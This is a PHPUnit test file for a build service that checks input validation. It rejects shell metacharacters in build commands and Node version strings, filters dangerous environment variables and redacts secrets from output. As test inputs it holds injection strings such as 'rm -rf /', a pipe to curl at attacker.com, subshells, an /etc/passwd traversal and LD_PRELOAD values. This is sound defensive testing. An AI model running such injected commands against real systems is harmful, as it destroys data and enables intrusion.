<?php

namespace Tests\Unit;

use App\Models\Site;
use App\Services\BuildService;
use Illuminate\Support\Facades\File;
use Tests\TestCase;

class BuildServiceTest extends TestCase
{
    private BuildService $service;

    protected function setUp(): void
    {
        parent::setUp();
        $this->service = app(BuildService::class);
    }

    // ── validateBuildCommand ───────────────────────────────────────────────

    public function test_build_command_with_semicolon_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->service->validateBuildCommand('npm run build; rm -rf /');
    }

    public function test_build_command_with_pipe_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->service->validateBuildCommand('npm run build | curl http://attacker.com');
    }

    public function test_build_command_with_backtick_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->service->validateBuildCommand('npm run build `id`');
    }

    public function test_build_command_with_dollar_subshell_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->service->validateBuildCommand('npm run build $(whoami)');
    }

    public function test_build_command_with_redirect_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->service->validateBuildCommand('npm run build > /tmp/out');
    }

    public function test_build_command_with_newline_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->service->validateBuildCommand("npm run build\nrm -rf /");
    }

    public function test_double_ampersand_is_allowed(): void
    {
        $this->service->validateBuildCommand('npm install && npm run build');
        $this->assertTrue(true);
    }

    public function test_plain_destructive_command_passes_validation(): void
    {
        // validateBuildCommand only rejects shell metacharacters, not arbitrary
        // commands — admin-level trust is required to set build_command.
        // The SitePolicy::configureBuild gate (admin-only) is the access guard.
        $this->service->validateBuildCommand('hugo --minify');
        $this->assertTrue(true);
    }

    // ── validateNodeVersion ───────────────────────────────────────────────

    public function test_node_version_with_semicolon_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->service->validateNodeVersion('18; rm -rf /');
    }

    public function test_node_version_with_space_injection_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->service->validateNodeVersion('18 && whoami');
    }

    public function test_node_version_with_slash_path_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->service->validateNodeVersion('18/../../etc/passwd');
    }

    public function test_node_version_major_only_is_accepted(): void
    {
        $this->service->validateNodeVersion('20');
        $this->service->validateNodeVersion('18');
        $this->assertTrue(true);
    }

    public function test_node_version_semver_is_accepted(): void
    {
        $this->service->validateNodeVersion('18.12.1');
        $this->service->validateNodeVersion('20.0.0');
        $this->assertTrue(true);
    }

    public function test_node_version_lts_alias_is_accepted(): void
    {
        $this->service->validateNodeVersion('lts/iron');
        $this->service->validateNodeVersion('lts/hydrogen');
        $this->assertTrue(true);
    }

    public function test_node_version_named_alias_is_accepted(): void
    {
        $this->service->validateNodeVersion('current');
        $this->service->validateNodeVersion('stable');
        $this->assertTrue(true);
    }

    public function test_empty_node_version_is_accepted(): void
    {
        $this->service->validateNodeVersion('');
        $this->assertTrue(true);
    }

    // ── DANGEROUS_ENV_VARS ─────────────────────────────────────────────────

    public function test_dangerous_env_var_constant_contains_required_entries(): void
    {
        $keys = BuildService::DANGEROUS_ENV_VARS;
        $this->assertContains('NODE_OPTIONS', $keys);
        $this->assertContains('LD_PRELOAD', $keys);
        $this->assertContains('DYLD_INSERT_LIBRARIES', $keys);
        $this->assertContains('PATH', $keys);
        $this->assertContains('SHELL', $keys);
    }

    public function test_env_filter_removes_dangerous_keys(): void
    {
        $dangerous = BuildService::DANGEROUS_ENV_VARS;
        $input = array_fill_keys($dangerous, 'injected');
        $input['VITE_APP_NAME'] = 'my-site';

        $filtered = array_filter(
            $input,
            fn (string $k) => ! in_array(strtoupper($k), $dangerous, true),
            ARRAY_FILTER_USE_KEY
        );

        foreach ($dangerous as $key) {
            $this->assertArrayNotHasKey($key, $filtered, "Key '{$key}' was not removed");
        }
        $this->assertArrayHasKey('VITE_APP_NAME', $filtered);
    }

    public function test_env_filter_is_case_insensitive(): void
    {
        $dangerous = BuildService::DANGEROUS_ENV_VARS;
        $input = ['node_options' => '--require /evil', 'ld_preload' => '/evil.so', 'SAFE' => 'ok'];

        $filtered = array_filter(
            $input,
            fn (string $k) => ! in_array(strtoupper($k), $dangerous, true),
            ARRAY_FILTER_USE_KEY
        );

        $this->assertArrayNotHasKey('node_options', $filtered);
        $this->assertArrayNotHasKey('ld_preload', $filtered);
        $this->assertArrayHasKey('SAFE', $filtered);
    }

    // ── scrubEnvValues ────────────────────────────────────────────────────

    public function test_scrub_replaces_secret_values_in_output(): void
    {
        $output = "Running build...\nmy-secret-token\nDone";
        $result = $this->service->scrubEnvValues($output, ['SECRET' => 'my-secret-token']);
        $this->assertStringNotContainsString('my-secret-token', $result);
        $this->assertStringContainsString('[REDACTED]', $result);
        $this->assertStringContainsString('Running build', $result);
    }

    public function test_scrub_skips_trivially_short_values(): void
    {
        $output = "abc xyz";
        // "abc" is 3 chars — below the 4-char minimum, should not be replaced
        $result = $this->service->scrubEnvValues($output, ['K' => 'abc']);
        $this->assertSame($output, $result);
    }

    // ── packageManager ────────────────────────────────────────────────────

    public function test_detects_pnpm_from_lockfile(): void
    {
        $dir = sys_get_temp_dir().'/bst-pnpm-'.uniqid();
        mkdir($dir, 0755, true);
        touch("{$dir}/pnpm-lock.yaml");

        $result = (new \ReflectionClass($this->service))
            ->getMethod('packageManager')
            ->invoke($this->service, $dir);

        $this->assertSame('pnpm', $result);
        File::deleteDirectory($dir);
    }

    public function test_defaults_to_npm_without_lockfile(): void
    {
        $dir = sys_get_temp_dir().'/bst-npm-'.uniqid();
        mkdir($dir, 0755, true);

        $result = (new \ReflectionClass($this->service))
            ->getMethod('packageManager')
            ->invoke($this->service, $dir);

        $this->assertSame('npm', $result);
        File::deleteDirectory($dir);
    }
}
